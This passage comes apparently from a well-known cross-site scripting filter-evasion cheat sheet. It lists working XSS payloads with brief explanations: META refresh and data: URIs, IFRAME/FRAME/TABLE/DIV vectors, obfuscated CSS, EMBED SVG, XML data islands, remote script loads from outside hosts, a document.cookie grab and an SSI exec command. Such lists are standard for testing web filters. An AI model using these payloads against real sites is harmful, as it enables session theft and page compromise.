<h2><a id="user-content-meta" class="anchor" aria-hidden="true" href="#meta"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>META</h2>
<p>The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:</p>
<pre><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
</code></pre>
<h3><a id="user-content-meta-using-data" class="anchor" aria-hidden="true" href="#meta-using-data"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>META using data</h3>
<p>Directive URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS <a href="http://ha.ckers.org/xsscalc.html" rel="nofollow">calculator</a> below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:</p>
<pre><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
</code></pre>
<h3><a id="user-content-meta-with-additional-url-parameter" class="anchor" aria-hidden="true" href="#meta-with-additional-url-parameter"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>META with additional URL parameter</h3>
<p>If the target website attempts to see if the URL contains <code>&lt;http://&gt;;</code> at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):</p>
<pre><code>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
</code></pre>
<h2><a id="user-content-iframe" class="anchor" aria-hidden="true" href="#iframe"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IFRAME</h2>
<p>If iframes are allowed there are a lot of other XSS problems as well:</p>
<pre><code>&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
</code></pre>
<h2><a id="user-content-iframe-event-based" class="anchor" aria-hidden="true" href="#iframe-event-based"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>IFRAME Event based</h2>
<p>IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross)</p>
<pre><code>&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;
</code></pre>
<h2><a id="user-content-frame" class="anchor" aria-hidden="true" href="#frame"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>FRAME</h2>
<p>Frames have the same sorts of XSS problems as iframes</p>
<pre><code>&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
</code></pre>
<h2><a id="user-content-table" class="anchor" aria-hidden="true" href="#table"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TABLE</h2>
<pre><code>&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
</code></pre>
<h3><a id="user-content-td" class="anchor" aria-hidden="true" href="#td"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TD</h3>
<p>Just like above, TD's are vulnerable to BACKGROUNDs containing
JavaScript XSS vectors:</p>
<pre><code>&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
</code></pre>
<h2><a id="user-content-div" class="anchor" aria-hidden="true" href="#div"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DIV</h2>
<h3><a id="user-content-div-background-image" class="anchor" aria-hidden="true" href="#div-background-image"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DIV background-image</h3>
<pre><code>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
</code></pre>
<h3><a id="user-content-div-background-image-with-unicoded-xss-exploit" class="anchor" aria-hidden="true" href="#div-background-image-with-unicoded-xss-exploit"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DIV background-image with unicoded XSS exploit</h3>
<p>This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:</p>
<pre><code>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"&gt;
</code></pre>
<h3><a id="user-content-div-background-image-plus-extra-characters" class="anchor" aria-hidden="true" href="#div-background-image-plus-extra-characters"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DIV background-image plus extra characters</h3>
<p>Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):</p>
<pre><code>&lt;DIV STYLE="background-image: url(�javascript:alert('XSS'))"&gt;
</code></pre>
<h3><a id="user-content-div-expression" class="anchor" aria-hidden="true" href="#div-expression"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>DIV expression</h3>
<p>A variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression":</p>
<pre><code>&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
</code></pre>
<h2><a id="user-content-downlevel-hidden-block" class="anchor" aria-hidden="true" href="#downlevel-hidden-block"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Downlevel-Hidden block</h2>
<p>Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job:</p>
<pre><code>&lt;!--[if gte IE 4]&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;![endif]--&gt;
</code></pre>
<h2><a id="user-content-base-tag" class="anchor" aria-hidden="true" href="#base-tag"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>BASE tag</h2>
<p>Works in IE and Netscape 8.1 in safe mode. You need the <code>//</code> to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like <code>images/image.jpg</code> rather than full paths. If the path includes a leading forward slash like <code>/images/image.jpg</code> you can remove one slash from this vector (as long as there are two to begin the comment this will work):</p>
<pre><code>&lt;BASE HREF="javascript:alert('XSS');//"&gt;
</code></pre>
<h2><a id="user-content-object-tag" class="anchor" aria-hidden="true" href="#object-tag"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>OBJECT tag</h2>
<p>If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:</p>
<pre><code>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/OBJECT&gt;
</code></pre>
<h2><a id="user-content-using-an-embed-tag-you-can-embed-a-flash-movie-that-contains-xss" class="anchor" aria-hidden="true" href="#using-an-embed-tag-you-can-embed-a-flash-movie-that-contains-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Using an EMBED tag you can embed a Flash movie that contains XSS</h2>
<p>Click here for a demo: <del><a href="http://ha.ckers.org/xss.swf" rel="nofollow">http://ha.ckers.org/xss.swf</a></del></p>
<pre><code>&lt;EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
</code></pre>
<p>If you add the attributes <code>allowScriptAccess="never"</code> and <code>allownetworking="internal"</code> it can mitigate
this risk (thank you to Jonathan Vanasco for the info).</p>
<h2><a id="user-content-you-can-embed-svg-which-can-contain-your-xss-vector" class="anchor" aria-hidden="true" href="#you-can-embed-svg-which-can-contain-your-xss-vector"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>You can EMBED SVG which can contain your XSS vector</h2>
<p>This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.</p>
<pre><code>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;
</code></pre>
<h2><a id="user-content-using-actionscript-inside-flash-can-obfuscate-your-xss-vector" class="anchor" aria-hidden="true" href="#using-actionscript-inside-flash-can-obfuscate-your-xss-vector"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Using ActionScript inside flash can obfuscate your XSS vector</h2>
<pre><code>a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")"; 
eval(a+b+c+d);
</code></pre>
<h2><a id="user-content-xml-data-island-with-cdata-obfuscation" class="anchor" aria-hidden="true" href="#xml-data-island-with-cdata-obfuscation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>XML data island with CDATA obfuscation</h2>
<p>This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:</p>
<pre><code>&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt; 
&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
</code></pre>
<h2><a id="user-content-locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island" class="anchor" aria-hidden="true" href="#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Locally hosted XML with embedded JavaScript that is generated using an XML data island</h2>
<p>This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:</p>
<pre><code>&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;  
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
</code></pre>
<h2><a id="user-content-htmltime-in-xml" class="anchor" aria-hidden="true" href="#htmltime-in-xml"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTML+TIME in XML</h2>
<p>This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:</p>
<pre><code>&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
&lt;?import namespace="t" implementation="#default#time2"&gt;
&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
</code></pre>
<h2><a id="user-content-assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" class="anchor" aria-hidden="true" href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Assuming you can only fit in a few characters and it filters against <code>.js</code></h2>
<p>You can rename your JavaScript file to an image as an XSS vector:</p>
<pre><code>&lt;SCRIPT SRC="http://xss.rocks/xss.jpg"&gt;&lt;/SCRIPT&gt;
</code></pre>
<h2><a id="user-content-ssi-server-side-includes" class="anchor" aria-hidden="true" href="#ssi-server-side-includes"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SSI (Server Side Includes)</h2>
<p>This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:</p>
<pre><code>&lt;!--#exec cmd="/bin/echo '&lt;SCR'"--&gt;&lt;!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;
</code></pre>
<h2><a id="user-content-php" class="anchor" aria-hidden="true" href="#php"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>PHP</h2>
<p>Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues:</p>
<pre><code>&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;
</code></pre>
